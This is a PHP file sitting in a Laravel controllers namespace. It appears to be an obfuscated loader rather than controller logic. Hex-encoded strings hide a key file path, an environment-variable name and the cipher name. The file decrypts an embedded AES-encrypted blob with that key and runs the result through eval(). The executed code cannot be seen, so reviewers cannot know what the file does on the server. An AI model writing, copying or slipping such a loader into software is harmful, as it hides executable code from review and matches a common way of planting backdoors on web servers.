<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('foBePMC25ECeX/KGUnQC6Q==');

$c=base64_decode(

'pzAh5054tgMLU98ZolGWJ5I8ihWQisChbumOrRKS/W0OS54RfCbDxXOYuwUjFU4H09HVz07fI3uV' .
'Kh833ZMdM19tA+KU3UE5ZCbZoihRzKWb9US0TotQSVqL5IoChO+lDLKvHkbzwSM8gjTTo4Ci+WI3' .
'VNpSXGrWf64ZX5PwhHRYWnsJ3ncBwdxDaygixIAa//0lOJbeemZWPszCzNtarHLiwsezP2c0C8Sz' .
'4fRTBhQsLpgK8XfDCIiFJGD3l1c2'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

